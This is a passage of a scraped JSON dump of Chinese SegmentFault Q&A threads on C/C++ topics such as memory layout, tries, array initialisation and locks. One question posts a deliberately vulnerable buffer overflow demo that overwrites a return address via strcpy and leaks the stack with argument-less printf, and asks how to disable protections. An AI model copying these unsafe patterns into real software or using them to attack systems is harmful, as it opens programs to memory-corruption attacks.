&lt;&lt; *url &lt;&lt; endl;//输出's'</pre><p>所以，总的来说，string用起来会比较方便，常量字符串在操纵起来就有点麻烦，也可以说是灵活吧，什么时候用哪个，就需要你自己衡量了。至于性能上，我想我还没有能力来分析！</p>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000133885\">\n<p>刚学C++，看书上说几种常量，数值常量我能理解，PI是个好例子。但是字符常量又要作何解？转义字符这个倒还好理解，有个实际用处单独定义出来。但是还有普通的字符常量，这个我就非常理解不能了，请问大家能不能给个例子证明这个有什么用？而且只能单引号什么的其实也挺纠结的。<br/>\n另外，C++是不是强语言，每个变量都必须定义类型什么的？没办法，从PHP转过去的，挺纠结这些基本问题的╮(╯▽╰)╭...<br/>\n再来就是定义字符串常量查到好几种方法：</p><pre>#include&lt;string&gt;\nstring url = \"segmentfault.com\";</pre><pre>const char url[] = \"segmentfault.com\";</pre><pre>const char *url = \"segmentfault.com\";</pre><pre>const char* url = \"segmentfault.com\";</pre><p>请问哪个好点？另外最后两个的*号做何解...新手问题还望大家要淡定，别凌乱就好。。。。</p>\n</div>",
      "favourite": "2",
      "glance": "5.9k",
      "tags": [
        "c++",
        "字符串",
        "常量"
      ],
      "time": "2012-10-31",
      "title": "C++中字符常量有什么用？",
      "url": "https://segmentfault.com/q/1010000000133885"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000157122\">\n<p>“栈”这个数据结构本身并没有规定其生长的方向，具体实现中向高地址或者低地址生长都无妨。但是对于操作系统而言，栈的生长方向一般是取决于处理器对PUSH/POP操作的实现。对于x86来说，PUSH以后SP/ESP的值是减小，因此它是向低地址生长的，样例代码：</p><pre>#include &lt;stdio.h&gt;\n\nvoid stack_growth(char *function_parameter) {\n    char local;\n    if (&amp;local &gt; function_parameter)\n        printf(\"up\\n\");\n    else\n        printf(\"down\\n\");\n    printf(\"%p %p\\n\", &amp;local, function_parameter);\n}\n\nint main()\n{\n    char c = 'c';\n    stack_growth(&amp;c);\n    return 0;\n}</pre><p>而声明一个变量，无非是告诉编译器，在栈上给它准备一块空间。因此你所提及的情况，实际上与栈无直接关系：a先声明的话，就一定会<strong>先</strong>在栈上为它分配空间吗？举个最简单的栗子，如果a根本没被用到，编译器完全可以不为它分配空间。所以这个最终还是取决于编译器的实现。</p><p>补充一段WIKI吧：</p><blockquote>Some processors families, such as the x86, have special instructions for manipulating the stack of the currently executing thread. Other processor families, including PowerPC and MIPS, do not have explicit stack support, but instead rely on convention and delegate stack management to the operating system's Application Binary Interface (ABI).</blockquote>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000157105\">\n<p>系统分配的内存区叫“栈区”，手动分配的内存空间叫“堆区”。<br/>\n在“栈区”地址扩展方向是从高地址向低地址，“堆区”相反。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000157176\">\n<p>局部变量的空间不是一个一个压入栈中的，而是一次性分配好的，所以理解为变量依次入栈是错误的。C语言也没有规定局部变量在内存中的位置，只是<strong>常常</strong>实现为先定义的变量在高地址、后定义的变量在低地址。不过局部变量在栈上的位置没有绝对的关系，甚至不一定会出现在栈上。比如你的代码做这样的调整，改成下面这样：</p><pre>#include&lt;stdio.h&gt;\n\nint main()\n{\n  int a = 1;\n  int b = 2;\n\n  printf( \"a = %d, b = %d\\n\", a, b );\n  printf( \"&amp;a = %08x, &amp;b = %08x\\n\", &amp;a, &amp;b );\n  return 0;\n}</pre><p>这个时候你会发现a变量确实分配在高地址，而b变量分配在低地址。如果你把你的程序加上-O2参数优化一下，那么a和b这两个变量因为没有被真正的使用，而被编译器优化掉，你直接p &amp;a会得不到任何的值。</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000157089\">\n<html><body>\n<p>这个问题是关于c和c++中对于参数，变量在内存中地址分配的问题。对于以下代码</p>\n<pre>int main (int argc, char *argv[]) {\n  int a;\n  int b;\n  a = 1;\n  b = 2;\n  return 0;\n}</pre>\n<p>我的理解是，main函数是通过初始函数调用，main函数实际和其他函数一样。<br>\n在初始函数调用main函数后，会先将返回地址压入堆栈，接着将参数压入堆栈。面对函数中定义的局部变量，将会按照定义顺序分配堆栈内存空间。而堆栈是从高地址向低地址生长的，所以我认为&amp;a &gt; &amp;b。<br>\n然而，在gdb调试过程中，我发现&amp;b &gt; &amp;a。请问我的理解在哪里错了?<br><img data-src=\"http://segmentfault.com/img/bVO1Q\"/></br></br></br></p>\n</body></html>\n</div>",
      "favourite": "9",
      "glance": "3.5k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2012-12-30",
      "title": "c语言中的内存分配",
      "url": "https://segmentfault.com/q/1010000000157089"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000191928\">\n<p>如果允许对txt文件预处理的话，可以用倒排索引来实现。</p>\n<p>如果txt文件只查一次、以后再也用不到的话，那就没有。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000474108\">\n<p>按你的题目来看，似乎这些单词都是排过序的？如果是有序的话，就可以按照二分的方法来做。先读取文件总共由多少行，然后以第一个字符来查找，再按照第二个字符，以此类推，这个算法的好处是不用读取所有文件到内存中。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000192027\">\n<p>这种情况考虑下面这种数据结构：\n字典树(DictTree)</p>\n<pre><code>typedef struct _dict_tree_\n{\n    struct _dict_tree_ * dt[TREENODENUM];\n    char    c ;\n    char    flag ;\n}DT ;\n</code></pre>\n<p>具体操作就是</p>\n<p>所谓的26叉树，按照每个字母对应的子节点存储。\n然后逐行读取单词后插入到树中，比如说：\n单词：abandon\n插入树的顺序就是\na-&gt;b-&gt;a-&gt;n-&gt;d-&gt;o-&gt;n\n插入每个字母对应这个树的子节点</p>\n<pre><code>int len = strlen(str);\nwhile( i &lt; len )\n{\n    index = str[i] - 97 ;　　　　　　　　/*通过 index 来找到子节点*/\n    if( pt-&gt;dt[index] == NULL )\n    {\n        pt-&gt;dt[index] = ( DT *)malloc( sizeof( DT) );\n        pt-&gt;dt[index]-&gt;c = str[i] ;\n        pt-&gt;dt[index]-&gt;flag = EMPTY ;\n        for( j = 0 ; j &lt; TREENODENUM ; j++ )\n        {\n            pt-&gt;dt[index]-&gt;dt[j] = NULL ;\n        }\n    }\n    pt = pt-&gt;dt[index] ;\n    i++;\n}\n</code></pre>\n<p>查找就是顺着字母判断子节点是否为空</p>\n<pre><code>int len = strlen(str);\nwhile( i != len )\n{\n    index = str[i] - 97 ;\n    if( pt-&gt;dt[index] == NULL )\n        return 0 ;\n    pt = pt-&gt;dt[index] ;\n    i++;\n}\n</code></pre>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000191910\">\n<p>用C或C++实现从一个比较大的txt文件里查找一个单词，txt文件里每行一个单词，按a~z从上到下排列，有什么好的算法，用什么数据结构可以提高查询的速度和效率？？</p>\n</div>",
      "favourite": "2",
      "glance": "4.1k",
      "tags": [
        "c",
        "c++",
        "算法",
        "数据结构"
      ],
      "time": "2013-04-22",
      "title": "关于用C从txt文件查找单词的搜索算法优化问题",
      "url": "https://segmentfault.com/q/1010000000191910"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000208912\">\n<p>在C++里只是一个普通的字符串。</p>\n<p>这个字符串应该是要用作表示Windows的环境变量吧，Windows的环境变量首尾有百分号。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000209550\">\n<p>%号只有在printf格式化的时候有用，但也只需要一个即可，如果不是在格式化里面的字符串，就单做一个普通的字符，原始字符，没啥特别的含义。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000302898\">\n<p>这个<code>%APPPATH%</code>代表的是Windows系统的环境变量，保存路径用，和C++本身没有关系</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000208904\">\n<pre><code>#define FILE_ICON \"%APPPATH%,1\"\n</code></pre>\n<p>%APPPATH%  是指？为什么两边要加上%</p>\n</div>",
      "favourite": "1",
      "glance": "2.7k",
      "tags": [
        "c++"
      ],
      "time": "2013-06-03",
      "title": "弱弱问一句c++中两个%什么意思？",
      "url": "https://segmentfault.com/q/1010000000208904"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000239916\">\n<p>我发现这不是个偶然或者个别现象，网上也有人说这个。我试了各种网上说的方法都不管用。C++ 程序还好，Qt Quick 项目启动调试之后要等好几分钟程序才跑起来，这到底是怎么回事儿？</p>\n</div>",
      "favourite": "1",
      "glance": "3.6k",
      "tags": [
        "qt",
        "qt-creator",
        "c++"
      ],
      "time": "2013-06-20",
      "title": "Windows 版的 Qt Creator 调试功能为什么如此慢？有什么解决方法吗？",
      "url": "https://segmentfault.com/q/1010000000239916"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000246923\">\n<p>书中提到，如果swap的缺省实现对你的class或class template 效率不足，试着做一下事情</p>\n<ol>\n<li>提供一个public swap成员函数，让它高效的置换你的类型的两个对象。</li>\n<li>在你的class 或template 所在的命名空间内提供一个non-member swap, 并另它调用上述swap成员。</li>\n<li>如果你正编写一个class( 而非class template)， 为你的class 特化std:swap.并另它调用你的swap函数。</li>\n</ol>\n<p>最后，如果你调用swap， 请确定包含一个using声明式，以便让std:swap在你的成员函数内曝光课件，然后不加任何namesapce修饰符，赤裸裸调用swap。</p>\n<p>我的疑问是有了第二点，还为什么要第三点？\n因为根据augument-dependent lookup，就能找到class 或tempalte命名空间的swap，然后就会调用之。为什么还要有第三点？感觉没必要啊。</p>\n</div>",
      "favourite": "0",
      "glance": "1.7k",
      "tags": [
        "c++"
      ],
      "time": "2013-06-24",
      "title": "effective c++中，条款25:考虑写出一个不抛出异常的swap函数 中的一个疑问。",
      "url": "https://segmentfault.com/q/1010000000246923"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000253877\">\n<p>java里面是个list</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000254762\">\n<p>protobuf repeated的数据类型和C++的Vector，list类似，只能传输相同的数据类型。\n当然，如果你为了传输多种数据类型，可以使用类似与C++union的方式，用个大消息，消息的每个字段都使用optional标记，你在业务处理的时候，每次只对一个字段赋值同样可以达到目的。<br/>\n另外： repeated只能表示数据有还是没有，在没有的时候，究竟是保留原有的数据不动，还是删除所有数据，这点有歧义。需要使用另外的字段进行处理。<br/>\n<a href=\"http://blog.csdn.net/chenxiaohong3905/article/details/6929430\" rel=\"nofollow\">http://blog.csdn.net/chenxiaohong3905/article/details/6929430</a><br/>\n<a href=\"http://blog.csdn.net/chenxiaohong3905/article/details/6906459\" rel=\"nofollow\">http://blog.csdn.net/chenxiaohong3905/article/details/6906459</a></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000253709\">\n<p>是的，<code>repeated</code> 就是说该字段是指定类型的数组。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000253677\">\n<p>是否可以用这个字段传输很多个该类型的数据？</p>\n</div>",
      "favourite": "1",
      "glance": "11.8k",
      "tags": [
        "c",
        "c++",
        "protobuf",
        "分布式"
      ],
      "time": "2013-07-12",
      "title": "protobuf repeated 怎么用的？",
      "url": "https://segmentfault.com/q/1010000000253677"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000259107\">\n<p>局部变量的空间分配在栈上；没有初始化的时候，取决于编译器的实现，一般不应该做任何假定。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000270658\">\n<p>C/C++中除了全局变量都不会进行初始化。需要程序员自己初始化，也就是像楼主说的那样。\n这个程序故意对没有初始化的数组读取。是不规范的代码</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000270681\">\n<p>“初始化”这个术语确实有些误导。不能顾名思义。数组的所谓“初始化”并非是“给数组分配内存”，而仅仅是“归零数组”。</p>\n<p>用 <code>char *string[10]</code> 这样的语句，就<strong>已经</strong>声明了数组，并<strong>分配</strong>了储存空间。储存空间是在<strong>栈上静态分配</strong>的。这时数组是可以使用的。</p>\n<p>但由于每一个程序分配到的内存都是“二手”的，里面可能有上一个程序保存的数据，因此这时，<strong>数组中的内容是随机内容</strong>。因此，我们需要对数组进行<strong>归零</strong>。这就叫<strong>数组的初始化</strong>。</p>\n<hr/>\n<p>对于数组的归零，有三种方式。考虑 <code>int a[10]</code> 这个数组：</p>\n<ol>\n<li><p>手工用 <code>a[0] = 0; a[1] = 0; a[2] = 0</code>…… 这样的语句</p>\n<p>这种做法是非常可笑的，效率低，容易出错，不应该使用。</p></li>\n<li><p>使用循环 <code>for (i = 0; i &lt; 10; i++) a[i] = 0;</code> </p>\n<p>这种做法本质上是和方法 1 相同的。效率很低，容易出错。<em>不过 <code>gcc</code> 等高级编译器可以优化成 <code>memset()</code>，因此一定要使用一款好的编译器。微软的编译器就不多说了。</em></p></li>\n<li><p><code>memset(a, 0, 10)</code></p>\n<p>不错的方法，这种方法使用的很广泛。但由于不是声明时就初始化，比较繁琐。</p></li>\n<li><p><code>int a[10] = {0};</code></p>\n<p><strong>好方法</strong>。这在声明时就给数组指定了全部是 <code>0</code> 的内容。</p>\n<p>有人要问了，哪里有这样的？难道不是：<code>int a[10] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0};</code> 吗？实际上，只写一个 <code>0</code> 是一种简便写法，所有元素都会被设置成 <code>0</code>，一目了然。</p></li>\n</ol>\n<hr/>\n<p>不同的编译器，或同款编译器在不同的编译选项下，可能会把数组自动清零。这种情况下，容易遗忘初始化数组。要小心 Debug 模式没问题，Release 模式有问题的陷阱。</p>\n<p>不过，如果你能保证，你访问的数组内容之前，已经向数组保存了有意义的数据，比如在使用 <code>a[0]</code> 之前已经 <code>a[0] = 2</code> 了，那么是没有任何问题的。</p>\n<p>通常来说，没事就给所有的元素都初始化一下是完全没必要的。比如：</p>\n<pre><code>char str[10] = {'\\0'};\nscanf(\"%s\", &amp;s);\n</code></pre>\n<p>是完全没必要的。<code>char str[10] = {'\\0'};</code> 完全可以改成 <code>char str[10];</code></p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000259102\">\n<p>今天看了一个代码：</p>\n<pre><code>int main(){\n　 char buff[10];\n   printf(\"%d\\n\", buff[2]);   // 输出一些随机的数字或字符\n   return(0);\n}\n</code></pre>\n<p>我也很久没接触C了，和我印象中C数组的声明有些不一样。我记得数组需要一些初始化的，类似 <code>char buff[10] = {0};</code> 或者 <code>static char buff[10];</code>。为何上面的数组不需要初始化？？还是我本来就记错了？？</p>\n<p>是不是当<code>char buff[10]</code>的时候，已经在内存中的<strong>什么</strong>地方为这个数组分配了空间？？当我用gdb调试的时候，print buff,会输出<code>_\\000%\\000\\000\\000\\000?\\177</code>。</p>\n<p>谢谢解疑。</p>\n</div>",
      "favourite": "0",
      "glance": "5.4k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2013-07-29",
      "title": "C 数组的初始化问题 ？",
      "url": "https://segmentfault.com/q/1010000000259102"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000268224\">\n<p><code>add(a, b)</code> 中，调用 <code>add(x, y, z)</code>，其中 <code>x = a</code>，<code>y = b</code>，<code>z</code> 取默认值 <code>m</code>，<code>m</code> 是全局变量，由系统初始化为 0，所以结果是 <code>a + b + 0 = 15</code>。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000758088\">\n<pre><code> 如果直接使用 using namespace std  是非常可怕的 ，它会将std 中所有定义的量全部加载到 该文件中，如果命名变量不当，会造成命名冲突，甚至会系统崩溃，  建议这样用 using std::cout;  using std::endl;     m  为全局变量，系统默认初始化为0 \n</code></pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000268230\">\n<p>先推荐楼主一本书《C++ primer》，用于入门应该更好些，因为我看楼主的代码写得很多地方不够规范，比如 C++ 中使用 <code>#include&lt;iostream&gt;</code> 而不是 C style 的 <code>#include&lt;iostream.h&gt;</code>,另外对namaspace的使用也应该放在main函数以外更规范些。\n好，现在回答问题，这里需要注意两点</p>\n<ol>\n<li>全局变量是如何初始化的</li>\n<li>默认形参如何赋值的</li>\n</ol>\n<p>先说第一个问题：一个由 C/C++ 编译的程序占用的内存分为以下几个部分：</p>\n<blockquote>\n<p>1）、栈区（Stack）：由编译器（Compiler）自动分配释放，存放函数的参数值，局部变的值等。其操作方式类似于数据结构中的栈。</p>\n<p>2）、堆区（Heap ）：一般由程序员分配释放，若程序员不释放，程序结束时可能由OS回收。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。</p>\n<p>3）、全局区（静态区）（static）：全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域，未初始化的全局变量和未初始化的静态变量在相邻的另一块区域。程序结束后由系统释放。</p>\n<p>4）、文字常量区：常量字符串就是放在这里的。程序结束后由系统释放。</p>\n<p>5）、程序代码区：存放函数体的二进制代码。</p>\n</blockquote>\n<p>你程序中的m就是一个全局变量，所以虽然你没给它赋初值，但它会被初始化为0。</p>\n<p>第二个问题，有默认值的参数如何使用，如果该参数被传递，择使用实参的值，所以形参 <code>y</code> 被赋值为实参b的值也就是10，而不是默认值15，而形参z没有被传递所以使用默认值也就是 <code>m=0</code>，所以自然是 <code>5 + 10 = 15</code></p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000268210\">\n<pre><code> #include&lt;iostream.h&gt;\n int m;\n int add(int x, int y =15, int z = m);\n int main(void)\n {\n     using namespace std;\n     int a = 5,b = 10,c = 20;\n     int s;\n     s = add(a,b);\n     cout&lt;&lt;s&lt;&lt;endl;\n }\n\n int add(int x,int y,int z)\n {\n     return x + y + z;\n }\n //end of this file\n</code></pre>\n<p>运行结果为什么是15而不是20呢？谁给我解释一下呗，谢谢</p>\n</div>",
      "favourite": "0",
      "glance": "1.8k",
      "tags": [
        "c++"
      ],
      "time": "2013-08-24",
      "title": "很简单的c++程序问题",
      "url": "https://segmentfault.com/q/1010000000268210"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000521936\">\n<p>推荐两个：</p>\n<ol>\n<li><p>开源项目的话推荐陈硕的muduo，代码风格很好，对用一些常用类有封装，而且陈硕的csdn博客有相关介绍。 <a href=\"https://github.com/chenshuo/muduo\" rel=\"nofollow\">https://github.com/chenshuo/muduo</a></p></li>\n<li><p><a href=\"https://github.com/yanyiwu/cppjieba\" rel=\"nofollow\">https://github.com/yanyiwu/cppjieba</a></p></li>\n</ol>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000325657\">\n<p>google protobuf ?</p>\n<p>借楼同求。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000328301\">\n<p><a href=\"https://fcitx-im.org/wiki/Fcitx\" rel=\"nofollow\">小企鹅输入法</a></p>\n<p><a href=\"https://github.com/lsegal/my_toy_compiler\" rel=\"nofollow\">某个Amazon工程师写的最简单的编译器</a></p>\n<p><a href=\"https://github.com/hzqtc/fmd\" rel=\"nofollow\">某个大牛写的豆瓣FM服务端</a> , 和 <a href=\"https://github.com/hzqtc/fmc\" rel=\"nofollow\">客户端</a></p>\n</div>",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000323272\">\n<p>求推荐c/c++开源小项目</p>\n</div>",
      "favourite": "12",
      "glance": "6.3k",
      "tags": [
        "c++",
        "c"
      ],
      "time": "2013-10-22",
      "title": "求推荐c/c++开源小项目",
      "url": "https://segmentfault.com/q/1010000000323272"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000334927\">\n<html><body>\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\nchar tracks[][80]=\n{\n    \"I left my heart in Harvard med school\",\n    \"Newark,Newark-a wonderful town\",\n    \"Dancing with a Dork\",\n    \"From here to maternity\",\n    \"The girl from two Jima\",\n};\nvoid find_track(char search_for[])\n{\n    int i;\n    for(i=0;i&lt;5;i++)\n    {\n        if(strstr(tracks[i],search_for))\n            printf(\"Track %i: '%s'\\n\",i+1,tracks[i]);      \n    }\n}\nint main()\n{\n    char search_for[80];\n    printf(\"Search for: \");\n    fgets(search_for,80,stdin);\n    find_track(search_for);\n    return 0;\n}\n</code></pre>\n<p>不管我输入什么字符串，strstr()函数返回的都是0，这是为什么呢？\n<img data-src=\"http://segmentfault.com/img/bVbzib\"/></p>\n</body></html>\n</div>",
      "favourite": "0",
      "glance": "2.1k",
      "tags": [
        "c",
        "c++",
        "程序员",
        "编程"
      ],
      "time": "2013-11-12",
      "title": "C语言中strstr()函数的使用问题",
      "url": "https://segmentfault.com/q/1010000000334927"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000355868\">\n<p>从github上clone了bitcoin的源码，看src文件里大多是cpp文件，应该是用c++写的，但是没找到main函数，如果我想在windows上编译运行，如何做呢？有人分析过源码么？</p>\n</div>",
      "favourite": "3",
      "glance": "4.4k",
      "tags": [
        "比特币",
        "c++",
        "开放源代码"
      ],
      "time": "2013-12-10",
      "title": "比特币最近这么热，有人分析过其源码么？",
      "url": "https://segmentfault.com/q/1010000000355868"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000367245\">\n<p>1和3回答的很清楚了，就补充下第二点：<br/>\nC语言标准库中，free函数原型是：<br/>\nvoid free (void* ptr);<br/>\nC语言标准中，void*和所有指向各种数据的指针都和char *一致，包括大小，对齐方式。<br/>\n所以在数据指针之间进行各种转换是没有问题的。</p>\n<p>但是请注意：C语言标准并未规定数据指针和函数指针是一样的，这是未定义行为。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000362339\">\n<ol>\n<li><p>malloc() 分配的内存块中包含一个<code>头块</code>，用来记录分配内存的大小等信息，free()会读取这个块，对内存进行释放。</p></li>\n<li><p>分配 int 类型内存大小，而只释放一半的空间（这里假设 int 为2字节），所以，当多余的内存持续增加时，占满内存空间，就会导致内存泄漏。</p></li>\n<li><p>这种释放方法是错误的，确定书中是这么写的吗？正确的写法应该是：</p></li>\n</ol>\n<pre><code class=\"lang-cpp\">for(p = head; p != NULL; p = q){\n    q = p-&gt;next;\n    free(p);\n    }\n</code></pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000361517\">\n<ol>\n<li>（glibc 的）malloc 等函数在分配时会记录每块内存的起始位置和大小</li>\n<li>看你加 C++ 标签了，但问的问题似乎仅仅是 C。在 C 语言中，一般是不转换 malloc 的返回值的类型的。通常情况下不会有问题。当 <code>char*</code> 的大小比 <code>int*</code> 小时由于整型截断，会出问题的（不是内存泄漏那么简单）。但是好像找不到这两种指针大小不一样的系统了吧？</li>\n<li><strong>永远不可行</strong>，因为它在逻辑上是错误的。一、另一线程可以在你访问之前使用了该内存块；二、内存分配器可以为了安全起见将已释放的内存清零；三、其它情况。</li>\n</ol>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000361508\">\n<p>1 一次性分配较大内存，free如何获知该内存大小并完全释放，实现机制是？</p>\n<p>2 如下代码：</p>\n<pre><code>int *p = (int*)malloc(sizeof(int));\nfree((char*)p);\n</code></pre>\n<p>什么情况下会出现内存泄漏？</p>\n<p>3 <code>&lt;c prime&gt;</code>一书一个版本在高级数据结构一节中写过如下代码：</p>\n<pre><code>while(p != NULL){\n    free(p);\n    p = p-&gt;next;\n}\n</code></pre>\n<p>这样的用法是否永远可行？</p>\n</div>",
      "favourite": "3",
      "glance": "2.7k",
      "tags": [
        "c",
        "c++",
        "程序员"
      ],
      "time": "2013-12-16",
      "title": "c中free函数的一些问题探讨",
      "url": "https://segmentfault.com/q/1010000000361508"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000432116\">\n<pre><code>void foo(char *data){\n    char name[10];\n\n    printf(\"%p\\n%p\\n%p\\n%p\\n\");//打印当前程序栈内存\n    strcpy(name, data);//覆盖返回地址\n}\n\nvoid hack(void){\n    puts(\"another place\");\n}\n\nint main(){\n    char buf[10];\n    char buf2[10];\n\n    scanf(\"%s\", buf);\n    foo(buf);\n\n    return 0;\n}\n</code></pre>\n<p>以上是经典的缓冲区溢出攻击，当buf中输入超过10(16)字节，将会覆盖buf2中的内容;如果写入更多字节数，可以改变寄存器中保存的地址，使得被调用函数执行完成后返回到另一个函数的入口地址。</p>\n<p>问题：<br>\n    当前保护机制下，只能覆盖buf2中内容，但是即便跳过很长的内存保护的区域依然找不到记录被调函数返回地址的位置。1.在linux下不采用任何内存保护方法编译源代码的方法？2.关于现在内存保护机制下缓冲区溢出攻击的可能形式。</br></p>\n</div>",
      "favourite": "3",
      "glance": "1.8k",
      "tags": [
        "安全",
        "c++",
        "c",
        "程序员"
      ],
      "time": "2014-03-13",
      "title": "探讨主流内存保护机制下的缓冲区溢出攻击可行形式",
      "url": "https://segmentfault.com/q/1010000000432116"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000505022\">\n<p>楼主需要的是进程(process)之间共共享内存，那么这个时候pthread无法帮忙，因为pthread是线程(thread)级别的锁。 进程之间共享内存一般通过memory mapped file来进行，参见mmap函数。如果需要枷锁操作，可以根据情况选用文件锁 fcntl,或者信号量(Semaphores) semget函数来进行读写的限制。<br>\n如果楼主本意是线程的话，那么pthread_rwlock应该就够了。</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000504725\">\n<p>一个读的信号量，一个写的信号量，读信号量初始化为0，写的信号量初始化为1。<br>\n读的时候先查看写是否为1，如果是，则将读信号量加1，完成后-1；若不是则表示现在不能读。写的时候先查看读的信号量是否为0，若为0，则将写的信号量-1；若不为0，就表示不能写，写完成后，写信号量加1.<br>\n记得以前学操作系统上面的</br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000504719\">\n<p>这不就是读写锁么？<br>\n参见pthread_rwlock_init(3)，需要定义__USE_UNIX98或__USE_XOPEN2K<br>\n或者 <a href=\"http://en.cppreference.com/w/cpp/thread/shared_lock\" rel=\"nofollow\">http://en.cppreference.com/w/cpp/thread/shared_lock</a></br></br></p>\n<p>另外，你用mutex和condition_variable自己实现一个也不麻烦</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000504702\">\n<p>语言是c/c++</p>\n<p>需求是这样的，有一段共享内存大家都可以读，只有一个进程可以写，然后大家读都没有问题，但是写的时候必须所有人都不在读的时候才可以写。</p>\n<p>两组lock操作，第一组把一个ref+-1，然后允许读取。<br>\n第二组lock的时候先等待ref=0，这时候所有第一种lock会被堵塞，然后等ref=0开始读写这部分内存，unlock之后放行第一种lock。</br></p>\n<p>这种锁如何实现，或者说叫什么名字？</p>\n<p>我自己想的办法是另开一个进程，然后和这些进程建立一个socket，然后其他进程向这个进程请求资源，请求之后开始read，当资源空闲的时候就直接write，否则就加入一个cleanup队列，直到写入操作介绍之后再一起write，但是我感觉这样太浪费资源来的。。</p>\n</div>",
      "favourite": "0",
      "glance": "1.9k",
      "tags": [
        "linux",
        "锁",
        "c++",
        "c"
      ],
      "time": "2014-05-13",
      "title": "Linux下怎么实现这样的锁？",
      "url": "https://segmentfault.com/q/1010000000504702"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000508355\">\n<p>当然能。</p>\n<p>所谓递归无非就是函数（直接或间接）调用自己，所以我们先看一下简单的函数调用。<br>\n假设有一个函数长这样：</br></p>\n<pre><code>int foo() {\n  int X = 4\n  int Y = bar(14);\n  return X*Y;\n}\n</code></pre>\n<p>你可以把它变成这样：</p>\n<pre><code>int foo() {\n  foo_stack_frame = gcalloc { X: int; Y: int }\n  foo_stack_frame-&gt;X = 4;\n  foo_stack_frame-&gt;Y = bar(14);\n  return foo_stack_frame-&gt;X * foo_stack_frame-&gt;Y;\n}\n</code></pre>\n<p>其中<code>gcalloc</code>就是指从GC heap上分配一个什么东西，这里分配的是一个map，用于保存foo的stack frame。<br>\n然后，foo可以变成这样：</br></p>\n<pre><code>int foo(continuation C) {\n  foo_stack_frame = gcalloc { C: continuation; X: int; Y: int }\n  foo_stack_frame-&gt;C = C;\n  foo_stack_frame-&gt;X = 4;\n  continuation Next = { foo2, foo_stack_frame };\n  return bar(Next, 14);\n}\n\nint foo2(continuation C, int Y) {\n  foo_stack_frame = C-&gt;stack_frame;\n  foo_stack_frame-&gt;Y = Y;\n  continuation Next = foo_stack_frame-&gt;C;\n  return Next-&gt;F(Next, foo_stack_frame-&gt;X * foo_stack_frame-&gt;Y);\n}\n</code></pre>\n<p>这里的<code>continuation</code>你可以认为就是一个“返回地址”，这个等下再说。<br>\n你很可能会问，这么一大堆变换到底是在干神马？<br>\n嗯，其实这一堆就只变换干了一件事，那就是——把所有的函数调用变成了tail call。<br>\n大家都知道，tail call是可以直接优化成goto的，所以我们必须记录下原本的返回地址，把它传递给被tail call的函数，这样它就可以在结束的时候直接返回到最初的调用者那里。<br>\n如果对每个函数都做这样的变换，让每个函数调用都是tail call，那我们就彻底干掉了stack，整个程序只用goto就搞定。</br></br></br></br></p>\n<p>PS. 